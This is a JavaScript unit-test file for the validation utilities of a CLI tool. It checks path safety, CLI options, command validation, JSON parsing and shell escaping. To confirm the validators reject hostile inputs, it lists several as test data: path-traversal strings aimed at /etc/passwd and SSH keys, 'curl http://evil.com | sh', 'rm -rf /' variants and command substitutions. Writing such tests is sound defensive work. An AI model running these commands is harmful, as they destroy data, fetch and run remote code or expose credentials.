import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import {
  validateSafePath,
  validateCLIType,
  validateOptions,
  sanitizePath,
  validateCommand,
  validateJSON,
  escapeShellArg,
} from '../../src/utils/validation.js'
import {
  ValidationError,
  PathTraversalError,
  CommandInjectionError,
} from '../../src/utils/errors.js'
import path from 'path'
import { setupTestDir, cleanupTestDir } from '../helpers/test-utils.js'

describe('Validation Utils', () => {
  describe('validateSafePath()', () => {
    let testDir

    it('should accept valid paths within base directory', async () => {
      testDir = await setupTestDir()
      const validPaths = ['file.txt', 'subdir/file.txt', './file.txt', 'deep/nested/path/file.txt']

      for (const validPath of validPaths) {
        const result = validateSafePath(validPath, testDir)
        assert(result.startsWith(testDir), `Path ${validPath} should be within test directory`)
      }

      await cleanupTestDir(testDir)
    })

    it('should reject path traversal attempts', async () => {
      testDir = await setupTestDir()
      const maliciousPaths = [
        '../../../etc/passwd',
        './../../../sensitive.txt',
        'subdir/../../../../../../etc/shadow',
        '../',
        '~/.ssh/id_rsa',
        '$HOME/.bashrc',
        '`cat /etc/passwd`',
        'file.txt|cat',
        'file.txt;rm -rf /',
        'file.txt&ls',
        'file.txt>output.txt',
        'file.txt<input.txt',
        'file\\..\\..\\windows\\system32',
      ]

      for (const maliciousPath of maliciousPaths) {
        assert.throws(
          () => validateSafePath(maliciousPath, testDir),
          PathTraversalError,
          `Should reject malicious path: ${maliciousPath}`,
        )
      }

      await cleanupTestDir(testDir)
    })

    it('should reject empty or invalid paths', () => {
      assert.throws(() => validateSafePath(''), ValidationError, 'Should reject empty path')

      assert.throws(() => validateSafePath(null), ValidationError, 'Should reject null path')

      assert.throws(
        () => validateSafePath(undefined),
        ValidationError,
        'Should reject undefined path',
      )
    })

    it('should resolve paths to absolute paths', async () => {
      testDir = await setupTestDir()
      const result = validateSafePath('relative/path.txt', testDir)
      assert(path.isAbsolute(result), 'Should return absolute path')
      assert(result.startsWith(testDir), 'Should be within base directory')
      await cleanupTestDir(testDir)
    })
  })

  describe('sanitizePath()', () => {
    it('should normalize and validate paths', async () => {
      const testDir = await setupTestDir()
      const originalCwd = process.cwd()
      process.chdir(testDir)

      try {
        const testCases = [
          { input: 'normal/path/file.txt', valid: true },
          { input: '  spaced/path.txt  ', valid: true },
          { input: './current/dir/file.txt', valid: true },
          { input: 'file\0name.txt', valid: false }, // null byte
          { input: '../escape/attempt.txt', valid: false },
        ]

        for (const testCase of testCases) {
          if (testCase.valid) {
            const result = sanitizePath(testCase.input)
            assert(typeof result === 'string', 'Should return string path')
          } else {
            assert.throws(
              () => sanitizePath(testCase.input),
              Error,
              `Should reject: ${testCase.input}`,
            )
          }
        }
      } finally {
        process.chdir(originalCwd)
        await cleanupTestDir(testDir)
      }
    })

    it('should reject invalid input types', () => {
      const invalidInputs = [null, undefined, 123, [], {}, true]

      for (const invalid of invalidInputs) {
        assert.throws(
          () => sanitizePath(invalid),
          ValidationError,
          `Should reject non-string input: ${invalid}`,
        )
      }
    })
  })

  describe('validateCLIType()', () => {
    it('should accept valid CLI types', () => {
      assert.equal(validateCLIType('claude'), 'claude')
      assert.equal(validateCLIType('gemini'), 'gemini')
    })

    it('should reject invalid CLI types', () => {
      const invalidTypes = ['openai', 'gpt', 'bard', 'Claude', 'GEMINI', '', null, undefined, 123]

      for (const invalid of invalidTypes) {
        assert.throws(
          () => validateCLIType(invalid),
          ValidationError,
          `Should reject invalid CLI type: ${invalid}`,
        )
      }
    })
  })

  describe('validateOptions()', () => {
    it('should validate init command options', () => {
      // Valid options
      assert.doesNotThrow(() => validateOptions('init', {}))
      assert.doesNotThrow(() => validateOptions('init', { force: true }))
      assert.doesNotThrow(() => validateOptions('init', { cli: 'claude' }))
      assert.doesNotThrow(() => validateOptions('init', { force: false, cli: 'gemini' }))

      // Invalid options
      assert.throws(
        () => validateOptions('init', { unknown: true }),
        ValidationError,
        'Should reject unknown option',
      )

      assert.throws(
        () => validateOptions('init', { cli: 'invalid' }),
        ValidationError,
        'Should reject invalid CLI type',
      )

      assert.throws(
        () => validateOptions('init', { force: 'yes' }),
        ValidationError,
        'Should reject non-boolean force option',
      )
    })

    it('should validate check command options', () => {
      // Valid options
      assert.doesNotThrow(() => validateOptions('check', {}))
      assert.doesNotThrow(() => validateOptions('check', { fix: true }))
      assert.doesNotThrow(() => validateOptions('check', { verbose: true }))
      assert.doesNotThrow(() => validateOptions('check', { fix: false, verbose: false }))

      // Invalid options
      assert.throws(
        () => validateOptions('check', { autofix: true }),
        ValidationError,
        'Should reject unknown option',
      )
    })

    it('should validate install-wrapper command options', () => {
      // Valid options
      assert.doesNotThrow(() => validateOptions('install-wrapper', {}))
      assert.doesNotThrow(() => validateOptions('install-wrapper', { global: true }))
      assert.doesNotThrow(() => validateOptions('install-wrapper', { force: true }))
      assert.doesNotThrow(() => validateOptions('install-wrapper', { global: false, force: false }))

      // Invalid options
      assert.throws(
        () => validateOptions('install-wrapper', { local: true }),
        ValidationError,
        'Should reject unknown option',
      )
    })

    it('should reject unknown commands', () => {
      assert.throws(
        () => validateOptions('unknown-command', {}),
        ValidationError,
        'Should reject unknown command',
      )
    })
  })

  describe('validateCommand()', () => {
    it('should accept safe commands', () => {
      const safeCommands = [
        'npm install',
        'node script.js',
        'python main.py',
        'git status',
        'ls -la',
        'echo Hello World',
      ]

      for (const cmd of safeCommands) {
        assert.equal(validateCommand(cmd), cmd, `Should accept: ${cmd}`)
      }
    })

    it('should reject commands with dangerous characters', () => {
      const dangerousCommands = [
        'rm -rf / ; echo done',
        'cat file.txt | grep password',
        'echo test && rm important.txt',
        'curl http://evil.com | sh',
        '`cat /etc/passwd`',
        '$(whoami)',
        'test > /dev/null',
        'input < file.txt',
        'cmd1 & cmd2',
        'python -c "import os; os.system(\'rm -rf /\')"',
        "node -e \"require('child_process').exec('rm -rf /')\"",
        'test\nrm -rf /',
        'test\r\nmalicious command',
      ]

      for (const cmd of dangerousCommands) {
        assert.throws(
          () => validateCommand(cmd),
          CommandInjectionError,
          `Should reject dangerous command: ${cmd}`,
        )
      }
    })

    it('should reject non-string inputs', () => {
      const invalidInputs = [null, undefined, 123, [], {}, true, '']

      for (const invalid of invalidInputs) {
        assert.throws(
          () => validateCommand(invalid),
          ValidationError,
          `Should reject non-string input: ${invalid}`,
        )
      }
    })
  })

  describe('validateJSON()', () => {
    it('should parse valid JSON', () => {
      const validJSON = '{"name": "test", "version": "1.0.0"}'
      const result = validateJSON(validJSON)
      assert.equal(result.name, 'test')
      assert.equal(result.version, '1.0.0')
    })

    it('should accept already parsed objects', () => {
      const obj = { name: 'test', version: '1.0.0' }
      const result = validateJSON(obj)
      assert.deepEqual(result, obj)
    })

    it('should validate against schema', () => {
      const schema = {
        name: { type: 'string', required: true },
        version: { type: 'string', required: true },
        dependencies: { type: 'object', required: false },
      }

      // Valid according to schema
      assert.doesNotThrow(() => {
        validateJSON('{"name": "test", "version": "1.0.0"}', schema)
      })

      // Missing required field
      assert.throws(
        () => validateJSON('{"name": "test"}', schema),
        ValidationError,
        'Should reject missing required field',
      )

      // Wrong type
      assert.throws(
        () => validateJSON('{"name": "test", "version": 123}', schema),
        ValidationError,
        'Should reject wrong type',
      )
    })

    it('should reject invalid JSON', () => {
      const invalidJSON = [
        '{invalid json}',
        '{"unclosed": "quote}',
        'not json at all',
        '{"trailing": "comma",}',
      ]

      for (const invalid of invalidJSON) {
        assert.throws(
          () => validateJSON(invalid),
          ValidationError,
          `Should reject invalid JSON: ${invalid}`,
        )
      }
    })
  })

  describe('escapeShellArg()', () => {
    it('should handle simple arguments', () => {
      assert.equal(escapeShellArg('simple'), 'simple')
      assert.equal(escapeShellArg('file.txt'), 'file.txt')
      assert.equal(escapeShellArg('path/to/file'), 'path/to/file')
    })

    it('should escape arguments with special characters', () => {
      assert.equal(escapeShellArg('hello world'), "'hello world'")
      assert.equal(escapeShellArg('file name.txt'), "'file name.txt'")
      assert.equal(escapeShellArg('test;rm -rf /'), "'test;rm -rf /'")
      assert.equal(escapeShellArg('$HOME'), "'$HOME'")
      assert.equal(escapeShellArg('`command`'), "'`command`'")
    })

    it('should handle quotes properly', () => {
      assert.equal(escapeShellArg("it's"), "'it'\"'\"'s'")
      assert.equal(escapeShellArg('say "hello"'), '\'say "hello"\'')
    })

    it('should handle empty or null inputs', () => {
      assert.equal(escapeShellArg(''), '""')
      assert.equal(escapeShellArg(null), '""')
      assert.equal(escapeShellArg(undefined), '""')
    })

    it('should convert non-strings to strings', () => {
      assert.equal(escapeShellArg(123), '123')
      assert.equal(escapeShellArg(true), 'true')
    })
  })
})
